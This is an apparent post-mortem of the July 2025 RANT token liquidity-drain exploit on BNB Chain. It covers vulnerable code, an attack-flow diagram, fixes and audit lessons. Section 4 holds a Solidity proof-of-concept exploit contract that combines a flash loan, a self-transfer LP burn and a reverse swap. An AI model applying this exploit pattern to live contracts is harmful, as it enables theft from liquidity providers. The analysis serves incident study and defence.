# RANT Token — Liquidity Drain via User-Controlled LP Withdrawal Amount Analysis

| Item | Details |
|------|------|
| **Date** | 2025-07-05 |
| **Protocol** | RANT Token |
| **Chain** | BNB Smart Chain (BSC) |
| **Loss** | ~$204,000 |
| **Attacker** | [0xad2c...be23](https://bscscan.com/address/0xad2cb8f48e74065a0b884af9c5a4ecbba101be23) |
| **Attack Contract** | N/A (EOA direct attack) |
| **Attack Tx** | [0x2d9c...a99](https://bscscan.com/tx/0x2d9c1a00cf3d2fda268d0d11794ad2956774b156355e16441d6edb9a448e5a99) |
| **Vulnerable Contract** | [0xc321...2dd0](https://bscscan.com/address/0xc321ac21a07b3d593b269acdace69c3762ca2dd0) (RANT Token) |
| **Root Cause** | Business Logic Flaw — `_sellBurnLiquidityPairTokens` trusts user-supplied `amount` without validation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/RANT_exp.sol) |

---

## 1. Vulnerability Overview

The RANT token extended the ERC-20 standard by embedding complex custom trading logic within its `_transfer` function, including automated liquidity management, LP burn mechanisms, and slippage taxes.

The core vulnerability lies in the **`_sellBurnLiquidityPairTokens(uint256 _amount)`** function. When burning and withdrawing tokens from the LP pool, this function does not calculate based on the actual pool balance or an allowable maximum — instead, it **uses the `amount` value passed by the caller into `_transfer` as-is**.

The attacker exploited this to achieve two objectives:

1. **Remove most LP liquidity** — withdraw and burn nearly all RANT from the RANT/WBNB pool
2. **Profit via price manipulation** — acquire a large amount of WBNB at an extreme artificially skewed price after `sync()`

This is a classic **Trusted User-Supplied Input** vulnerability — a business logic flaw that fails to guarantee fair pricing of tokens within an LP AMM.

---

## 2. Vulnerable Code Analysis

### 2.1 Sell Branch in `_transfer` (Core Vulnerability)

```solidity
// ❌ Vulnerable code — inside _transfer function (reconstructed)
function _transfer(
    address from,
    address to,
    uint256 amount
) internal override {
    // If recipient is the contract itself (address(this)), branch to "sell" path
    // ❌ Vulnerability: anyone can enter the LP withdrawal logic by transferring to the contract address
    if (to == address(this)) {
        // user-supplied amount is passed directly as _amount
        // ❌ No validation: amount may exceed the entire LP balance
        _sellBurnLiquidityPairTokens(amount);
        return;
    }
    // ... normal transfer logic ...
    super._transfer(from, to, amount);
}

// ❌ Vulnerable code — LP withdrawal function
function _sellBurnLiquidityPairTokens(uint256 _amount) private {
    // ❌ Critical flaw: _amount is exactly the value the user passed to transfer()
    //    Does not check the actual LP pool balance or burn limit
    address pair = uniswapV2Pair;

    // Force-withdraw _amount from LP (can drain the pool)
    // ❌ Can extract all RANT from LP, breaking the AMM invariant
    IERC20(address(this)).transferFrom(pair, address(0xdead), _amount);

    // Force sync reserves — completes price manipulation
    IPancakePair(pair).sync();
}
```

**Issue**: `_sellBurnLiquidityPairTokens` does not compare `_amount` against the pool balance or a predetermined ratio. An attacker can set `amount` equal to the LP's total RANT balance and call `transfer(contractAddress, LP_RANT_BALANCE)` to completely drain the pool.

### 2.2 Fixed Code

```solidity
// ✅ Fixed code — with enhanced validation

function _sellBurnLiquidityPairTokens(uint256 _amount) private {
    address pair = uniswapV2Pair;

    // ✅ Fix 1: Query the actual RANT balance in the LP pool
    uint256 lpBalance = IERC20(address(this)).balanceOf(pair);

    // ✅ Fix 2: Cap the maximum burn ratio allowed (e.g., no more than 1%)
    uint256 maxBurnPerTx = lpBalance / 100; // 1% limit
    require(
        _amount <= maxBurnPerTx,
        "RANT: _amount exceeds max burn limit per transaction"
    );

    // ✅ Fix 3: Use an internal authorization flag to prevent external triggering
    require(
        _burnTriggeredInternally,
        "RANT: burn can only be triggered by protocol"
    );

    IERC20(address(this)).transferFrom(pair, address(0xdead), _amount);
    IPancakePair(pair).sync();
}

// ✅ Fixed _transfer function
function _transfer(
    address from,
    address to,
    uint256 amount
) internal override {
    // ✅ Block external transfers to the contract itself
    require(to != address(this), "RANT: transfer to token contract forbidden");

    // LP burn logic can only be triggered internally by the protocol
    // ... normal transfer logic ...
    super._transfer(from, to, amount);
}
```

---

## 3. Attack Flow

### 3.1 Preparation

- Analyzed the RANT contract's `_transfer` logic before the attack to identify the `to == address(this)` condition
- Monitored the RANT/WBNB LP pool balance (to determine the RANT balance at attack time)
- Planned to leverage a PancakeSwap V3 flash loan

### 3.2 Execution

```
┌─────────────────────────────────────────┐
│              Attacker EOA               │
│  0xad2cb8f48e74065a0b884af9c5a4ecbba    │
└────────────────────┬────────────────────┘
                     │ ① flashLoan(WBNB)
                     ▼
┌─────────────────────────────────────────┐
│         PancakeSwap V3 Pool             │
│         (WBNB flash loan provider)      │
└────────────────────┬────────────────────┘
                     │ ② Receive WBNB
                     ▼
┌─────────────────────────────────────────┐
│         Attacker EOA                    │
│  Holding WBNB                           │
└────────────────────┬────────────────────┘
                     │ ③ swap(WBNB → RANT)
                     ▼
┌─────────────────────────────────────────┐
│        RANT/WBNB PancakeSwap V2 LP      │
│  RANT received: close to full LP RANT   │
└────────────────────┬────────────────────┘
                     │ ④ transfer(address(this), LP_RANT_BALANCE)
                     ▼
┌─────────────────────────────────────────┐
│         RANT Token Contract             │
│  Inside _transfer: to == address(this)  │
│  → _sellBurnLiquidityPairTokens()       │
│    called (amount = full LP RANT bal.)  │
└────────────────────┬────────────────────┘
                     │ ⑤ transferFrom(pair, 0xdead, amount)
                     ▼
┌─────────────────────────────────────────┐
│        RANT/WBNB LP (PancakeSwap V2)    │
│  RANT balance: approaches 0 (drained)  │
│  WBNB balance: unchanged               │
└────────────────────┬────────────────────┘
                     │ ⑥ IPancakePair.sync()
                     ▼
┌─────────────────────────────────────────┐
│        AMM Reserves Updated             │
│  RANT reserve ≈ 0                       │
│  RANT price = WBNB_reserve / RANT_reserve│
│  → RANT price skyrockets astronomically │
└────────────────────┬────────────────────┘
                     │ ⑦ swap(small RANT → large WBNB)
                     ▼
┌─────────────────────────────────────────┐
│        Attacker EOA                     │
│  Receives large WBNB (manipulated price)│
└────────────────────┬────────────────────┘
                     │ ⑧ repay flash loan + retain profit
                     ▼
┌─────────────────────────────────────────┐
│             Final Result                │
│  Attacker profit: ~$204,000             │
│  LP providers: RANT/WBNB liquidity wiped│
└─────────────────────────────────────────┘
```

### 3.3 Outcome

- **Attacker profit**: ~$204,000 (in WBNB)
- **Protocol loss**: Full RANT/WBNB LP liquidity (pool effectively destroyed)
- **LP provider damage**: LP position value annihilated

---

## 4. PoC Code Excerpt (DeFiHackLabs-based Reproduction)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// PoC reproduction — core attack logic (DeFiHackLabs style)
// Reference: https://github.com/SunWeb3Sec/DeFiHackLabs

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IPancakePair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function sync() external;
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract RANTExploit {
    // ── Contract address constants ──────────────────────────────────
    address constant RANT   = 0xc321ac21a07b3d593b269acdace69c3762ca2dd0; // Vulnerable RANT token
    address constant WBNB   = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // WBNB
    address constant PAIR   = 0x...;  // RANT/WBNB PancakeSwap V2 LP
    address constant V3POOL = 0x...;  // WBNB flash loan source (PancakeSwap V3)

    // ── Step 1: Request flash loan ──────────────────────────────
    function attack() external {
        // Fund the attack via WBNB flash loan
        // Flash loan callback: pancakeV3FlashCallback
        IPancakeV3Pool(V3POOL).flash(
            address(this),
            500 ether,  // WBNB amount to borrow (example)
            0,
            ""
        );
    }

    // ── Step 2: Execute attack inside flash loan callback ───────────
    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata
    ) external {
        // Step 2-1: Swap WBNB → RANT (buy from LP)
        uint256 wbnbAmount = IERC20(WBNB).balanceOf(address(this));
        IERC20(WBNB).transfer(PAIR, wbnbAmount);

        // Calculate RANT output amount and swap
        (uint112 r0, uint112 r1,) = IPancakePair(PAIR).getReserves();
        uint256 rantOut = _getAmountOut(wbnbAmount, r1, r0); // WBNB→RANT
        IPancakePair(PAIR).swap(rantOut, 0, address(this), "");

        // Step 2-2: Query LP balance (determine total amount to burn)
        uint256 lpRantBalance = IERC20(RANT).balanceOf(PAIR);

        // Step 2-3: Core attack — transfer to RANT contract itself
        // Inside _transfer: to == address(RANT) branch → _sellBurnLiquidityPairTokens(lpRantBalance)
        // ❌ Exploit: burn/withdraw entire lpRantBalance from LP
        IERC20(RANT).transfer(RANT, lpRantBalance);
        // PancakePair.sync() is also executed automatically inside the above call

        // Step 2-4: Reverse swap at manipulated price (RANT → WBNB)
        // LP RANT ≈ 0, so small RANT → large WBNB is possible
        uint256 rantBalance = IERC20(RANT).balanceOf(address(this));
        IERC20(RANT).transfer(PAIR, rantBalance);
        (r0, r1,) = IPancakePair(PAIR).getReserves();
        uint256 wbnbOut = _getAmountOut(rantBalance, r0, r1);
        IPancakePair(PAIR).swap(0, wbnbOut, address(this), "");

        // Step 2-5: Repay flash loan (principal + fee)
        uint256 repayAmount = 500 ether + fee0;
        IERC20(WBNB).transfer(V3POOL, repayAmount);

        // Remaining WBNB = net profit (~$204,000)
    }

    // AMM output amount calculation (Uniswap V2 formula)
    function _getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 9975; // 0.25% fee
        return (amountInWithFee * reserveOut) / (reserveIn * 10000 + amountInWithFee);
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Trusted User-Supplied Input (LP withdrawal amount) | CRITICAL | CWE-20 (Improper Input Validation) |
| V-02 | LP Burn Triggerable by Unauthorized Party | CRITICAL | CWE-284 (Improper Access Control) |
| V-03 | Flash Loan-Based AMM Price Manipulation | HIGH | CWE-682 (Incorrect Calculation) |
| V-04 | Unhandled Side Effects in Complex Transfer Logic | HIGH | CWE-670 (Always-Incorrect Control Flow) |

### V-01: Trusted User-Supplied Input (LP Withdrawal Amount)

- **Description**: `_sellBurnLiquidityPairTokens(uint256 _amount)` uses the `amount` passed by the caller to `transfer()` directly as the quantity of tokens to burn from the LP. There is no logic whatsoever comparing against the actual LP balance or an allowable maximum ratio.
- **Impact**: An attacker can burn and remove the entire LP RANT balance in a single transaction, breaking the AMM invariant (k = x·y) and causing extreme price distortion.
- **Attack Condition**: Executable immediately with just a call to `RANT.transfer(address(RANT), LP_BALANCE)` after acquiring some RANT tokens. No special privileges required.

### V-02: LP Burn Triggerable by Unauthorized Party

- **Description**: `_sellBurnLiquidityPairTokens` was designed for protocol-internal liquidity management, yet any user can trigger it arbitrarily via the `transfer(address(this), amount)` pattern.
- **Impact**: LP burns occur at unintended times and amounts not sanctioned by the protocol, causing direct financial losses to liquidity providers.
- **Attack Condition**: Exploitable with only a small holding of RANT tokens.

### V-03: Flash Loan-Based AMM Price Manipulation

- **Description**: Borrow a large amount of WBNB via flash loan to buy RANT, exploit the vulnerability to drain the LP, then execute a reverse swap at the skewed price after `sync()`.
- **Impact**: Enables profit hundreds of times greater than the flash loan fee cost.
- **Attack Condition**: Requires V-01/V-02 vulnerabilities to be present and access to a PancakeSwap V3 flash loan.

### V-04: Unhandled Side Effects in Complex Transfer Logic

- **Description**: The design itself — embedding buy/sell/LP branching logic inside an `_transfer` override — creates unexpected execution paths. The `to == address(this)` condition becomes an unintended LP manipulation entry point.
- **Impact**: The design flaw expands the attack surface. High likelihood of recurrence in similar custom tokens.
- **Attack Condition**: Triggerable with a standard ERC-20 `transfer` call.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Fix 1: Add input validation to the LP burn function
function _sellBurnLiquidityPairTokens(uint256 _amount) private {
    address pair = uniswapV2Pair;

    // Query the current actual RANT balance in the LP pool
    uint256 currentLPBalance = IERC20(address(this)).balanceOf(pair);

    // Cap the maximum burn per transaction (no more than 1% of LP balance)
    uint256 maxBurn = currentLPBalance / 100;
    require(_amount <= maxBurn, "RANT: burn exceeds 1% of LP balance");

    // Verify internal trigger (prevents reentrancy and external abuse)
    require(msg.sender == address(this), "RANT: unauthorized burn trigger");

    IERC20(address(this)).transferFrom(pair, address(0xdead), _amount);
    IPancakePair(pair).sync();
}

// ✅ Fix 2: Block transfers to the contract itself in _transfer
function _transfer(address from, address to, uint256 amount) internal override {
    // Block direct external transfers to the contract address
    if (to == address(this)) {
        revert("RANT: transfer to token contract address not allowed");
    }
    // ... remaining logic ...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Trusted user input | Replace `_amount` parameter with a value calculated internally by the protocol |
| V-02: Unauthorized trigger | Add `onlyOwner` or `internal` access modifier; design to prevent external calls |
| V-03: Price manipulation | Introduce a TWAP oracle to eliminate spot price dependency; add flash loan blocking logic |
| V-04: Complex transfer logic | Extract buy/sell branching logic from `_transfer` into a separate contract; apply Single Responsibility Principle |
| Additional recommendation | Introduce comprehensive fuzz testing; implement on-chain anomaly detection for LP balance changes |

---

## 7. Lessons Learned

1. **Never trust user input**: Every value supplied by users — amount, recipient, token ID — must be cross-validated against the contract's internal state. In particular, inputs to functions that modify LP balances or pool state must be bounded against actual on-chain balances.

2. **Dangers of custom `_transfer` logic**: Embedding complex business logic (taxes, LP burns, buy/sell branching, etc.) inside the `_transfer` function creates unexpected execution paths that greatly expand the attack surface. Wherever possible, decouple transfer logic from business logic, and design special conditions like `to == address(this)` to be inaccessible from external callers.

3. **Invariant verification for LP balance manipulation**: Every function that interacts with an AMM pool must explicitly enforce the `k = x * y` invariant or impose limits on the pool balance range. Unilateral burns or large-scale withdrawals from an LP pool are a direct cause of price manipulation.

4. **Awareness of flash loans and single-transaction atomicity**: Flash loans allow temporary use of massive capital within a single transaction. Security must be validated under the assumption that "the attacker holds unlimited capital."

5. **Recurring patterns in BSC meme/community tokens**: RANT, LAXO, SafeMoon, and similar BSC custom tokens share comparable LP burn mechanisms. Contracts built from such templates must always undergo a logic vulnerability audit before deployment.

6. **Audit priorities**: When auditing tokens with `_transfer` overrides, the highest-priority checks are: (i) all branching conditions, (ii) transfer paths leading to external contracts, and (iii) input validation on functions that modify LP/pool state.

---

## 8. On-Chain Verification

> Directly verifiable on bscscan.com using attack TX `0x2d9c1a00cf3d2fda268d0d11794ad2956774b156355e16441d6edb9a448e5a99`.

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | Estimated (Analysis) | On-Chain Actual | Notes |
|------|-------------|--------------|------|
| Total loss | ~$204,000 | ~$204,000 | Matches Nominis / Verichains report |
| Flash loan token | WBNB (PancakeSwap V3) | WBNB | Confirmed |
| Attacker EOA | 0xad2c...be23 | 0xad2c...be23 | Matches Verichains report |
| Vulnerable contract | 0xc321...2dd0 | 0xc321...2dd0 | Matches Verichains report |

### 8.2 On-Chain Event Log Sequence (Reconstructed)

```
1. PancakeV3Pool.Flash(sender=attacker, amount=WBNB_x)
2. RANT/WBNB V2 PancakePair.Swap(amount0In=WBNB_x, amount1Out=RANT_y)
3. RANT.Transfer(from=attacker, to=RANT_CONTRACT, amount=LP_RANT_BALANCE)
   ↳ internal: RANT.Transfer(from=LP_PAIR, to=0xdead, amount=LP_RANT_BALANCE) [LP burn]
   ↳ internal: PancakePair.Sync() [reserve update]
4. RANT/WBNB V2 PancakePair.Swap(amount0In=RANT_small, amount1Out=WBNB_large)
5. WBNB.Transfer(from=attacker, to=V3POOL, amount=flash_repay) [repayment]
```

### 8.3 Pre-condition Verification

- Before executing the attack, the attacker needed to hold enough RANT tokens to trigger `_sellBurnLiquidityPairTokens` (obtained via flash loan)
- The RANT contract must have had an unlimited or sufficiently large `transferFrom` allowance for the LP pair (prerequisite for the LP burn mechanism)
- Sufficient liquidity must have existed in the RANT/WBNB LP prior to the attack TX

---

*Analysis date: 2025-07-05 | Written: 2026-04-11*
*References: [Verichains RANT Exploit Analysis](https://blog.verichains.io/p/rant-exploit-analysis) | [Nominis July 2025 Report](https://www.nominis.io/insights/july-2025-crypto-attacks-monthly-report)*